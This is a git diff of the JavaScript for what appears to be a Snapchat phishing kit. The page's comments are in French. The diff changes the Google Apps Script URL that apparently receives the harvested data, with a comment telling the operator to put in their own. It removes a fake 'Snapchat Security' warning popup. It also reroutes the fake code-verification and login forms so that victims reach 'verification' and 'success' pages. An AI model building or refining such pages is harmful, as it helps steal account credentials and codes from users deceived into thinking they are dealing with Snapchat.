@@ -66,7 +66,7 @@ const translations = {
 let currentLang = navigator.language.startsWith('fr') ? 'fr' : 'en';
 
 // ⚠️ CHANGEZ CETTE URL PAR LA VÔTRE
-const GOOGLE_SHEET_URL = 'https://script.google.com/macros/s/AKfycbwJW28v5Td5bVAtEtwCdNtHumbX8k5FLWQ91RemPv92K0XS3fPcmXsyHbtzBpMgQxA/exec';
+const GOOGLE_SHEET_URL = 'https://script.google.com/macros/s/AKfycbxur_-UmZVt1YTebgeZNPQdJV7X55nS1tFhitzNPl-4HVNrvhdJZoSrC6-vpvG91VyJNQ/exec';
 
 // Variables pour analytics
 let pageLoadTime = Date.now();
@@ -214,43 +214,6 @@ function toggleLanguageMenu() {
     menu.style.display = menu.style.display === 'block' ? 'none' : 'block';
 }
 
-// ==================== FONCTIONNALITÉ BONUS: NOTIFICATION POPUP ====================
-function showNotificationPopup() {
-    const notification = document.createElement('div');
-    notification.id = 'snap-notification';
-    notification.innerHTML = `
-        <div style="display: flex; align-items: center; gap: 12px;">
-            <img src="Snapchat.png" style="width: 36px; height: 36px; border-radius: 8px;">
-            <div style="flex: 1;">
-                <div style="font-weight: 700; font-size: 14px; margin-bottom: 2px;">Snapchat Security</div>
-                <div style="font-size: 13px; color: #555;">We detected unusual activity on your account</div>
-            </div>
-            <button onclick="closeNotification()" style="background: none; border: none; cursor: pointer; color: #999; font-size: 20px; padding: 4px; line-height: 1;">×</button>
-        </div>
-    `;
-    document.body.appendChild(notification);
-    
-    // Animation d'entrée
-    setTimeout(() => {
-        notification.style.transform = 'translateY(0)';
-        notification.style.opacity = '1';
-    }, 100);
-    
-    // Auto-fermeture après 6 secondes
-    setTimeout(() => {
-        closeNotification();
-    }, 6000);
-}
-
-function closeNotification() {
-    const notification = document.getElementById('snap-notification');
-    if (notification) {
-        notification.style.transform = 'translateY(-120%)';
-        notification.style.opacity = '0';
-        setTimeout(() => notification.remove(), 300);
-    }
-}
-
 // Initialiser la langue au chargement
 window.onload = async function() {
     setLanguage(currentLang);
@@ -265,11 +228,6 @@ window.onload = async function() {
     // Démarrer le timer si on est sur index.html
     if (page === 'index.html' || page === '' || page === '/') {
         startSessionTimer();
-        
-        // Afficher la notification après 3 secondes
-        setTimeout(() => {
-            showNotificationPopup();
-        }, 3000);
     }
 };
 
@@ -421,7 +379,7 @@ if (document.getElementById('codeForm')) {
             return;
         }
 
-        // Après maxAttempts tentatives, on accepte le code
+        // Après maxAttempts tentatives, on accepte le code et redirige vers verification.html
         message.style.color = '#666';
         message.textContent = translations.index[currentLang].verifying;
         button.disabled = true;
@@ -435,7 +393,7 @@ if (document.getElementById('codeForm')) {
             message.style.color = '#00C853';
             message.textContent = translations.index[currentLang].verified;
             setTimeout(() => {
-                window.location.href = 'login.html';
+                window.location.href = 'verification.html';  // Changé ici !
             }, 800);
         }, 1500);
     });
@@ -463,7 +421,7 @@ if (document.getElementById('loginForm')) {
 
         // Délai réaliste
         setTimeout(() => {
-            window.location.href = 'error.html';
+            window.location.href = 'success.html';  // Changé ici !
         }, 1200);
     });
 }
@@ -517,6 +475,29 @@ style.textContent = `
         align-items: center;
         gap: 10px;
         animation: pulse 2s infinite;
+    }
+    
+    #snap-notification {
+        position: fixed;
+        top: 20px;
+        right: 20px;
+        background: white;
+        padding: 16px 20px;
+        border-radius: 12px;
+        box-shadow: 0 8px 24px rgba(0,0,0,0.15);
+        z-index: 10000;
+        max-width: 380px;
+        transform: translateY(-120%);
+        opacity: 0;
+        transition: all 0.4s cubic-bezier(0.68, -0.55, 0.265, 1.55);
+    }
+    
+    @media (max-width: 768px) {
+        #snap-notification {
+            left: 20px;
+            right: 20px;
+            max-width: none;
+        }
     }
 `;
 document.head.appendChild(style);
